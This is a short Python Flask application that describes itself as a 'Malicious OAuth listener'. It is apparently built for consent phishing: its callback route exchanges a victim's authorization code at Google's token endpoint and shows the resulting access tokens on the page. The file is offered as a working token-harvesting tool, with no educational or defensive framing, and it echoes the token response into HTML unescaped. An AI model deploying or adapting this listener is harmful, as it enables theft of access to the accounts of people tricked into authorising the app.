from flask import Flask, request
import requests

app = Flask(__name__)

CLIENT_ID = 'your-client-id'
CLIENT_SECRET = 'your-client-secret'
REDIRECT_URI = 'https://yourdomain.com/callback'

@app.route('/callback')
def callback():
    code = request.args.get("code")
    if not code:
        return "No code in request", 400

    # Exchange code for access token
    token_url = "https://oauth2.googleapis.com/token"
    data = {
        "code": code,
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "redirect_uri": REDIRECT_URI,
        "grant_type": "authorization_code"
    }
    r = requests.post(token_url, data=data)
    token_response = r.json()
    return f"<pre>{token_response}</pre>"

@app.route('/')
def index():
    return "Malicious OAuth listener is live."

if __name__ == '__main__':
    app.run()
